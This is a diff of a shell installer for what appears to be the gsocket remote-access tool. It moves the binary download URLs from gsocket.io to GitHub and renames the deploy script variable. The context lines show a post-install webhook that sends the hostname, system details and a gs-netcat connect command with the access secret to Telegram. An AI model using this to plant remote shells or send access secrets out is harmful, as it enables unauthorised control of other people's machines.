@@ -97,9 +97,16 @@ CICD_GS_BRANCH=
 ###-----END-----
 [[ $CICD_GS_BRANCH == "master" ]] && unset CICD_GS_BRANCH
 [[ -z $GS_BRANCH ]] && GS_BRANCH="${CICD_GS_BRANCH}"
+unset CICD_GS_BRANCH
+SCRIPT_DEPLOY_NAME="y"
 
-URL_BASE_CDN="https://cdn.gsocket.io"
-URL_BASE_X="https://gsocket.io"
+# URL_BASE_CDN="https://cdn.gsocket.io"
+# URL_BASE_X="https://gsocket.io"
+
+# DEFAULT: Pure GitHub:
+# GitHub action changes this to https://gsocket.io for www deployment.
+URL_BASE_CDN="https://github.com/hackerschoice/gsocket.io/blob/gh-pages"
+URL_BASE_X="https://github.com/hackerschoice/binary/tree/main/gsocket"
 
 # -----BEGIN deploy_server.sh HOOK-----
 # These stubs are filled out by deploy_server.sh:
@@ -140,9 +147,9 @@ URL_BIN_FULL="${URL_BASE_CDN}/full" # full version (with -h working)
 	URL_BIN="${GS_URL_BIN}"
 	URL_BIN_FULL="$URL_BIN"
 }
-[[ -n $GS_URL_DEPLOY ]] && URL_DEPLOY="${GS_URL_DEPLOY}" || URL_DEPLOY="${URL_BASE_X}/y"
+[[ -n $GS_URL_DEPLOY ]] && URL_DEPLOY="${GS_URL_DEPLOY}" || URL_DEPLOY="${URL_BASE_X}/${SCRIPT_DEPLOY_NAME}"
 
-# WEBHOOKS are executed after a successfull install
+# WEBHOOKS are executed after a successful install
 # shellcheck disable=SC2016 #Expressions don't expand in single quotes, use double quotes for that.
 msg='$(hostname) --- $(uname -rom) --- gs-netcat -i -s ${GS_SECRET}'
 ### Telegram
